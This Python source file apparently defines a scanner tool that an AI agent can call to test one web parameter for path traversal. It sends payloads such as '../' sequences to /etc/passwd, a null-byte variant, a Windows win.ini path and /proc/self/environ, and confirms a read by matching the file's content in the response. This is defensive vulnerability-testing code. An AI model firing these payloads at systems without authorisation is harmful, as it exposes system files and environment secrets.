"""Path traversal / local file inclusion — read files outside the intended
directory by walking up with ../ sequences and confirming known file content
(/etc/passwd, Windows win.ini) in the response."""
from __future__ import annotations

import re

from proofmark.tools._paraminject import base_value, set_param, send_timed
from proofmark.tools.base import Tool, ToolResult

_PROBES = [
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//etc/passwd",
    "/etc/passwd",
    "../../../../../../../../etc/passwd%00",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "/proc/self/environ",
]
_SIG = re.compile(r"root:.*?:0:0:|daemon:.*?:/usr/sbin|\[fonts\]|\[extensions\]|"
                  r"16-bit app support|PATH=|HOME=/", re.IGNORECASE)


class PathTraversalTool(Tool):
    name = "path_traversal_test"
    description = (
        "Test one parameter for path traversal / local file inclusion. Walks up the tree with ../ "
        "(and encoded/Windows variants) to read /etc/passwd, win.ini, or /proc/self/environ, and "
        "confirms by the file's signature content in the response. Give the full url and the "
        "parameter (e.g. ?file=, ?path=, ?page=, ?template=). A confirmed read is high severity."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "Full URL including the parameter's value."},
            "param": {"type": "string", "description": "Parameter to inject into."},
            "method": {"type": "string", "description": "HTTP method (default GET)."},
            "where": {"type": "string", "enum": ["query", "body"], "description": "query (default) or body."},
            "body": {"type": "string", "description": "Form body, required when where=body."},
        },
        "required": ["url", "param"],
    }
    returns_untrusted_data = True

    def __init__(self, client) -> None:
        self._client = client

    def run(self, url="", param="", method="GET", where="query", body=None, **_) -> ToolResult:
        method, where = (method or "GET").upper(), ("body" if where == "body" else "query")
        if base_value(url, param, where, body) is None:
            return ToolResult(f"Parameter '{param}' was not found in the {where}.", is_error=True)
        for probe in _PROBES:
            u, b = set_param(url, param, where, body, probe)
            _s, rbody, _t = send_timed(self._client, method, u, b)
            m = _SIG.search(rbody)
            if m:
                snippet = rbody[m.start():m.end() + 40].strip().replace("\n", "\\n")
                return ToolResult(
                    f"PATH TRAVERSAL CONFIRMED on '{param}' (high). Payload {probe!r} returned file "
                    f"content: {snippet!r}. Record the finding citing this.")
        return ToolResult(f"No path traversal detected on '{param}'. File-read probes returned no "
                          "recognizable file content.")
